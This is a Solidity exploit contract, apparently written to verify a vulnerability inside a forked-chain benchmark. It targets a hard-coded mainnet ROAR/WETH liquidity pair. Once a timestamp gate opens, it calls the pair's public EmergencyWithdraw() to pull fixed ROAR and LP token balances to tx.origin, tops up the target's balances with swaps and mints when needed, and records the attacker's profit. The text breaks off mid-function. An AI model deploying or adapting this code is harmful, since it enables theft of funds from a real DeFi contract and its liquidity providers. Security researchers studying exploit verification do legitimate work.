pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IWETHLike is IERC20Like {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike is IERC20Like {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function mint(address to) external returns (uint256 liquidity);
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
    function sync() external;
}

contract FlawVerifier {
    address internal constant TARGET = 0x13028E6b95520ad16898396667d1e52cB5E550Ac;
    address internal constant ROAR = 0xb0415D55f2C87b7f99285848bd341C367FeAc1ea;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    uint256 internal constant UNLOCK_TIME = 1744770479;
    uint256 internal constant REQUIRED_ROAR = 100000000099978910611013632;
    uint256 internal constant REQUIRED_LP = 26777446972437561344;

    bytes4 internal constant EMERGENCY_WITHDRAW_SELECTOR = bytes4(keccak256("EmergencyWithdraw()"));

    address internal _beneficiary;
    uint256 internal _roarProfit;
    uint256 internal _lpProfit;
    uint256 internal _wethProfit;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external payable {
        address receiver = tx.origin;
        _beneficiary = receiver;

        if (block.timestamp < UNLOCK_TIME) {
            return;
        }

        uint256 roarBefore = _safeBalanceOf(ROAR, receiver);
        uint256 lpBefore = _safeBalanceOf(TARGET, receiver);
        uint256 wethBefore = _safeBalanceOf(WETH, receiver);

        // The core exploit path remains unchanged: once the timestamp gate is open and the target
        // holds the hard-coded ROAR and LP balances, a public EmergencyWithdraw() call sends
        // both fixed transfers to tx.origin. The only extra step below is realistic market seeding
        // to restore those fixed balances when the forked state has already been partially drained.
        if (!_pathReady()) {
            _attemptAttackerFundedSeeding();
        }

        if (_pathReady()) {
            (bool ok, ) = TARGET.call(abi.encodeWithSelector(EMERGENCY_WITHDRAW_SELECTOR));
            if (ok) {
                _captureReceiverProfit(receiver, roarBefore, lpBefore, wethBefore);
            }
        }
    }

    function profitToken() external view returns (address) {
        if (_wethProfit > 0) {
            return WETH;
        }
        if (_roarProfit > 0) {
            return ROAR;
        }
        if (_lpProfit > 0) {
            return TARGET;
        }
        return address(0);
    }

    function profitAmount() external view returns (uint256) {
        if (_wethProfit > 0) {
            return _wethProfit;
        }
        if (_roarProfit > 0) {
            return _roarProfit;
        }
        if (_lpProfit > 0) {
            return _lpProfit;
        }
        return 0;
    }

    function beneficiary() external view returns (address) {
        return _beneficiary;
    }

    function roarProfit() external view returns (uint256) {
        return _roarProfit;
    }

    function lpProfit() external view returns (uint256) {
        return _lpProfit;
    }

    function wethProfit() external view returns (uint256) {
        return _wethProfit;
    }

    function target() external pure returns (address) {
        return TARGET;
    }

    function profitTokenCandidate() external pure returns (address) {
        return ROAR;
    }

    function pathReady() external view returns (bool) {
        return _pathReady();
    }

    function _captureReceiverProfit(
        address receiver,
        uint256 roarBefore,
        uint256 lpBefore,
        uint256 wethBefore
    ) internal {
        uint256 roarAfter = _safeBalanceOf(ROAR, receiver);
        uint256 lpAfter = _safeBalanceOf(TARGET, receiver);
        uint256 wethAfter = _safeBalanceOf(WETH, receiver);

        if (roarAfter > roarBefore) {
            _roarProfit += roarAfter - roarBefore;
        }
        if (lpAfter > lpBefore) {
            _lpProfit += lpAfter - lpBefore;
        }
        if (wethAfter > wethBefore) {
            _wethProfit += wethAfter - wethBefore;
        }
    }

    function _attemptAttackerFundedSeeding() internal {
        // A deterministic flashswap top-up is not self-repayable here because the vulnerable payout
        // is hard-wired to tx.origin rather than this contract. Under the no-cheat constraints, the
        // only realistic helper path is attacker-funded spot buying/minting from live V2 pools.

        uint256 currentRoar = _safeBalanceOf(ROAR, TARGET);
        uint256 currentLp = _safeBalanceOf(TARGET, TARGET);

        uint256 roarShortfall = REQUIRED_ROAR > currentRoar ? REQUIRED_ROAR - currentRoar : 0;
        uint256 lpShortfall = REQUIRED_LP > currentLp ? REQUIRED_LP - currentLp : 0;

        if (roarShortfall > 0) {
            _seedRoarShortfall(roarShortfall);
        }

        if (lpShortfall > 0) {
            _seedLpShortfall(lpShortfall);
        }
    }

    function _seedRoarShortfall(uint256 amountNeeded) internal {
        uint256 heldRoar = _safeBalanceOf(ROAR, address(this));
        if (heldRoar >= amountNeeded) {
            _safeTransfer(ROAR, TARGET, amountNeeded);
            return;
        }

        address altPair = _findAlternateRoarWethPair();
        if (altPair == address(0)) {
            return;
        }

        uint256 purchased = _buyRoarWithHeldWeth(altPair, amountNeeded - heldRoar);
        uint256 totalRoar = heldRoar + purchased;
        if (totalRoar > 0) {
            uint256 toSend = totalRoar > amountNeeded ? amountNeeded : totalRoar;
            _safeTransfer(ROAR, TARGET, toSend);
        }
    }

    function _seedLpShortfall(uint256 amountNeeded) internal {
        address token0 = _safeToken0(TARGET);
        address token1 = _safeToken1(TARGET);

        if (token0 == address(0) || token1 == address(0)) {
            return;
        }

        bool roarIs0 = token0 == ROAR;
        bool roarIs1 = token1 == ROAR;
        if (!roarIs0 && !roarIs1) {
            return;
        }

        address sideToken = roarIs0 ? token1 : token0;
        if (sideToken != WETH) {
            return;
        }

        (uint112 reserve0, uint112 reserve1, ) = IUniswapV2PairLike(TARGET).getReserves();
        uint256 reserveRoar = roarIs0 ? uint256(reserve0) : uint256(reserve1);
        uint256 reserveWeth = roarIs0 ? uint256(reserve1) : uint256(reserve0);
        uint256 totalSupply = _safeTotalSupply(TARGET);

        if (reserveRoar == 0 || reserveWeth == 0 || totalSupply == 0) {
            return;
        }

        uint256 roarNeeded = (amountNeeded * reserveRoar) / totalSupply + 1;
        uint256 wethNeeded = (amountNeeded * reserveWeth) / totalSupply + 1;

        if (_safeBalanceOf(ROAR, address(this)) < roarNeeded) {
            address altPair = _findAlternateRoarWethPair();
            if (altPair != address(0)) {
                _buyRoarWithHeldWeth(altPair, roarNeeded - _safeBalanceOf(ROAR, address(this)));
            }
        }

        if (_safeBalanceOf(ROAR, address(this)) < roarNeeded || _safeBalanceOf(WETH, address(this)) < wethNeeded) {
            return;
        }

        _safeTransfer(ROAR, TARGET, roarNeeded);
        _safeTransfer(WETH, TARGET, wethNeeded);

        uint256 minted = _safeMint(TARGET, address(this));
        if (minted == 0) {
            return;
        }

        uint256 lpToSend = minted > amountNeeded ? amountNeeded : minted;
        _safeTransfer(TARGET, TARGET, lpToSend);
    }

    function _buyRoarWithHeldWeth(address pair, uint256 minRoarNeeded) internal returns (uint256 bought) {
        if (pair == address(0)) {
            return 0;
        }

        address token0 = _safeToken0(pair);
        address token1 = _safeToken1(pair);
        if (!((token0 == ROAR && token1 == WETH) || (token0 == WETH && token1 == ROAR))) {
            return 0;
        }

        (uint112 reserve0, uint112 reserve1, ) = IUniswapV2PairLike(pair).getReserves();
        bool roarIs0 = token0 == ROAR;
        uint256 reserveRoar = roarIs0 ? uint256(reserve0) : uint256(reserve1);
        uint256 reserveWeth = roarIs0 ? uint256(reserve1) : uint256(reserve0);
        if (reserveRoar == 0 || reserveWeth == 0) {
            return 0;
        }

        uint256 wethBalance = _safeBalanceOf(WETH, address(this));
        if (wethBalance == 0 && address(this).balance > 0) {
            IWETHLike(WETH).deposit{value: address(this).balance}();
            wethBalance = _safeBalanceOf(WETH, address(this));
        }
        if (wethBalance == 0) {
            return 0;
        }

        uint256 amountIn = _amountInForExactOut(minRoarNeeded, reserveWeth, reserveRoar);
        if (amountIn > wethBalance) {
            amountIn = wethBalance;
        }
        if (amountIn == 0) {
            return 0;
        }

        uint256 expectedOut = _amountOut(amountIn, reserveWeth, reserveRoar);
        if (expectedOut == 0) {
            return 0;
        }

        _safeTransfer(WETH, pair, amountIn);
        if (roarIs0) {
            _safeSwap(pair, expectedOut, 0, address(this));
        } else {
            _safeSwap(pair, 0, expectedOut, address(this));
        }

        bought = expectedOut;
    }

    function _findAlternateRoarWethPair() internal view returns (address pair) {
        address uniPair = _safeGetPair(UNISWAP_V2_FACTORY, ROAR, WETH);
        if (uniPair != address(0) && uniPair != TARGET) {
            return uniPair;
        }

        address sushiPair = _safeGetPair(SUSHISWAP_FACTORY, ROAR, WETH);
        if (sushiPair != address(0) && sushiPair != TARGET) {
            return sushiPair;
        }

        return address(0);
    }

    function _pathReady() internal view returns (bool) {
        return block.timestamp >= UNLOCK_TIME
            && _safeBalanceOf(ROAR, TARGET) >= REQUIRED_ROAR
            && _safeBalanceOf(TARGET, TARGET) >= REQUIRED_LP;
    }

    function _amountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) {
            return 0;
        }
        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / ((reserveIn * 1000) + amountInWithFee);
    }

    function _amountInForExactOut(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) internal pure returns (uint256) {
        if (amountOut == 0 || reserveIn == 0 || reserveOut == 0 || amountOut >= reserveOut) {
            return 0;
        }
        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        return (numerator / denominator) + 1;
    }

    function _safeGetPair(address factory, address tokenA, address tokenB) internal view returns (address pair) {
        (bool ok, bytes memory data) =
            factory.staticcall(abi.encodeWithSelector(IUniswapV2FactoryLike.getPair.selector, tokenA, tokenB));
        if (ok && data.length >= 32) {
            pair = abi.decode(data, (address));
        }
    }

    function _safeToken0(address pair) internal view returns (address token) {
        (bool ok, bytes memory data) = pair.staticcall(abi.encodeWithSelector(IUniswapV2PairLike.token0.selector));
        if (ok && data.length >= 32) {
            token = abi.decode(data, (address));
        }
    }

    function _safeToken1(address pair) internal view returns (address token) {
        (bool ok, bytes memory data) = pair.staticcall(abi.encodeWithSelector(IUniswapV2PairLike.token1.selector));
        if (ok && data.length >= 32) {
            token = abi.decode(data, (address));
        }
    }

    function _safeMint(address pair, address to) internal returns (uint256 liquidity) {
        (bool ok, bytes memory data) = pair.call(abi.encodeWithSelector(IUniswapV2PairLike.mint.selector, to));
        if (ok && data.length >= 32) {
            liquidity = abi.decode(data, (uint256));
        }
    }

    function _safeSwap(address pair, uint256 amount0Out, uint256 amount1Out, address to) internal returns (bool) {
        (bool ok, ) =
            pair.call(abi.encodeWithSelector(IUniswapV2PairLike.swap.selector, amount0Out, amount1Out, to, bytes("")));
        return ok;
    }

    function _safeTransfer(address token, address to, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        return ok && (data.length == 0 || abi.decode(data, (bool)));
